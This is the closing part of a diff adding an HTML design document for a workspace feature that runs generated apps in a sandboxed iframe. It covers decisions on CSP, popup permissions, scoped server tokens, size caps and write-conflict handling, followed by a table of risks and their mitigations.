+    <div class="row"><div class="q">External scripts, images, styles?</div><div class="a"><b>No external scripts.</b> CSP meta blocks them. Mount images and styles inlined as today; external images allowed via <code>img-src https:</code> if templates need them.</div></div>
+    <div class="row"><div class="q">Popups in Run mode?</div><div class="a"><b>Neither.</b> Drop <code>allow-popups</code> and <code>allow-popups-to-escape-sandbox</code>; add <code>allow-forms</code>. A popup is the one egress channel no CSP directive can close, and Run has no need of one — external links route through the host’s <code>nav</code> message.</div></div>
+    <div class="row"><div class="q">Server-side folder guarantee?</div><div class="a"><b>Superseded — it is enforced now.</b> The original answer was “none in v1, by design; a scoped token is phase 5 if apps become shareable”. That deferral rested on an app having no way to get data out, which proved false twice — popups, then WebRTC, each found by thinking of one more exit. Enumerating exits against a browser does not terminate, so the folder is now a server boundary: a prefix-scoped token (<code>core/apps/scope_token.py</code>) that the mounts router checks on every file call. It only narrows, so a call without one is an ordinary drive request and the Files pane is untouched.</div></div>
+    <div class="row"><div class="q">Size caps?</div><div class="a"><b>4 MB per read, 1 MB per write</b>, error <code>too_large</code>. Part of the contract, not the implementation.</div></div>
+    <div class="row"><div class="q">Live data and refresh?</div><div class="a"><b>Tier 0 in phase 1, tier 1 in v1.1, tiers 2 and 3 designed only.</b> The app never fetches. See "Refresh, designed in from the start".</div></div>
+    <div class="row"><div class="q">Conflict detection on write?</div><div class="a"><b>Yes, in phase 1.</b> ETag + <code>If-Match</code> in the API, sent automatically by the stub. App side only in v1; agent tools stay unconditional.</div></div>
+    <div class="row"><div class="q">Public name and versioning?</div><div class="a"><b><code>window.agenta</code>, <code>version: 1</code></b>, error codes frozen in the doc.</div></div>
+    <div class="row"><div class="q">One or two panes, or N?</div><div class="a"><b>Two is the product limit.</b> State shape does not encode it; UI does.</div></div>
+    <div class="row"><div class="q">Config as a tab?</div><div class="a"><b>No.</b> Config stays the left pane on both hosts. Revisit after phase 4.</div></div>
+    <div class="row"><div class="q">Close a running conversation: stop or just close?</div><div class="a"><b>Stop, as today.</b> Change only when a session can have two views.</div></div>
+    <div class="row"><div class="q">Explorer pinned or following focus?</div><div class="a"><b>Pinned to its drive</b>, session name in the tab. Follow-focus is a later explicit toggle.</div></div>
+    <div class="row"><div class="q">Which kinds in v1?</div><div class="a"><b>file, explorer, app.</b> Child agent, website and computer are not planned.</div></div>
+  </div>
+</section>
+
+<section id="risks">
+  <h2>Risks and what retires them</h2>
+  <div class="tbl"><table>
+    <thead><tr><th>Risk</th><th>Where it bites</th><th>Mitigation</th></tr></thead>
+    <tbody>
+      <tr><td>Generated HTML depends on a contract we then change</td><td>Phase 1 onward</td><td>Version from day one; the bridge stub rejects unknown versions with a visible message; templates pin <code>version: 1</code></td></tr>
+      <tr><td>Client-only folder scope read as a security promise</td><td>Docs, sales</td><td>Doc states the real boundary is mount permission plus the sandbox; no "folder-scoped security" wording anywhere user-facing</td></tr>
+      <tr><td>Moving a tab remounts the iframe and loses app state</td><td>Phase 3</td><td>Accepted for v1: the app's state is in files. Port is closed on unmount; new iframe re-runs under the same grant without re-prompt</td></tr>
+      <tr><td>Desktop-only workspace, mobile diverges again</td><td>Phase 2</td><td>Package-first; 2.5 is in the definition of done, not a follow-up</td></tr>
+      <tr><td>Files-pane openers latch the old scope flag and fight the workspace</td><td>Phase 2.4</td><td>Delete <code>filesPaneOpenAtomFamily</code>; every opener goes through <code>open()</code>. Grep for <code>useSessionFilesPane</code> callers before starting</td></tr>
+      <tr><td>Two large transcripts plus an iframe stall typing</td><td>Phase 2.6, 4</td><td>Measure before phase 4; hidden session tabs keep the runtime but skip render (existing visited-set contract)</td></tr>
+      <tr><td>Agent and app overwrite each other's data file</td><td>Phase 1</td><td>WP 1.6 + 1.3: ETag and <code>If-Match</code>, automatic in the stub. Agent side stays unconditional in v1; skill says read-before-write; a conditional write tool for agents is v2</td></tr>
+      <tr><td>A bad edit to an app or data file cannot be undone</td><td>Later</td><td>The bundled SeaweedFS bucket is versioned with retention; expose list-versions and restore in the mounts API when it bites. Cloud buckets are the operator's call</td></tr>
+      <tr><td>localStorage quota with inline attachments plus layout</td><td>Phase 2.1</td><td>Layout stores refs only; never file bytes or grants</td></tr>
+    </tbody>
+  </table></div>
+  <p class="small">Branch <code>feat/playground-workspace</code> is checked out clean in this worktree, so phase 2 work can start there. Phase 1 belongs on its own branch off the open release branch since it ships independently.</p>
+</section>
+</main>
+</div>
+</div>
+
+</body>
+</html>
